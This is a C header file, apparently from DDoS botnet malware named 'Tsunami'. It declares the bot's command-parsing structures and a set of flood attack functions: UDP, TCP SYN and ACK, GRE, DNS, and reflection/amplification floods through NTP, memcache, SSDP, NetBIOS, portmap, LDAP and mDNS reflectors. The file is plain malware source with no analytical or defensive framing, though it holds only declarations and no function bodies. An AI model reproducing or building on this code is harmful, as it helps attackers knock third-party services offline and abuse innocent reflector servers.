#ifdef TSUNAMI_COMMAND
#pragma once

struct target
{
	struct sockaddr_in dest_addr;
	uint32_t address;
	char *domain;
	char *copy;
	uint16_t domain_len;
};

typedef void (* COMMAND_FUNC) ();

struct command
{
	uint8_t type;
	uint8_t id;
	COMMAND_FUNC func;
	struct command *next;
};

struct reflectors
{
	uint32_t address;
};

struct request
{
	uint16_t vector;
	uint32_t count;
};

struct utility
{
	char *str;
	uint16_t str_len;
};

enum
{
	// Types
	COMMAND_TYPE_FLOOD = 1,
	COMMAND_TYPE_UTIL = 0,
	// Commands
	COMMAND_FLOOD_UDP = 0,
	COMMAND_UTIL_KILL = 0,
	COMMAND_FLOOD_TCP_SYN = 1,
	COMMAND_FLOOD_TCP_ACK = 2,
	COMMAND_FLOOD_NTP = 3,
	COMMAND_FLOOD_MEMCACHE = 4,
	COMMAND_FLOOD_SSDP = 5,
	COMMAND_FLOOD_NETBIOS = 6,
	COMMAND_FLOOD_PORTMAP = 7,
	COMMAND_FLOOD_LDAP = 8,
	COMMAND_FLOOD_MDNS = 9,
	COMMAND_FLOOD_DNS = 10,
	COMMAND_FLOOD_GRE = 11,
	// References for the reflection server to deploy the correct reflectors
	VECTOR_NTP = 0,
	VECTOR_MEMCACHE = 1,
	VECTOR_SSDP = 2,
	VECTOR_NETBIOS = 3,
	VECTOR_PORTMAP = 4,
	VECTOR_LDAP = 5,
	VECTOR_MDNS = 6,
};

void command_parse(char *, uint16_t);
void terminate_instance(void);
void init_commands(void);
void flood_udp(struct target *, uint16_t, uint8_t);
void flood_tcp_syn(struct target *, uint16_t, uint8_t);
void flood_tcp_ack(struct target *, uint16_t, uint8_t);
void flood_ntp(struct target *, uint16_t, uint8_t);
void flood_memcache(struct target *, uint16_t, uint8_t);
void flood_ssdp(struct target *, uint16_t, uint8_t);
void flood_netbios(struct target *, uint16_t, uint8_t);
void flood_portmap(struct target *, uint16_t, uint8_t);
void flood_ldap(struct target *, uint16_t, uint8_t);
void flood_mdns(struct target *, uint16_t, uint8_t);
void flood_dns(struct target *, uint16_t, uint8_t);
void flood_gre(struct target *, uint16_t, uint8_t);
#endif
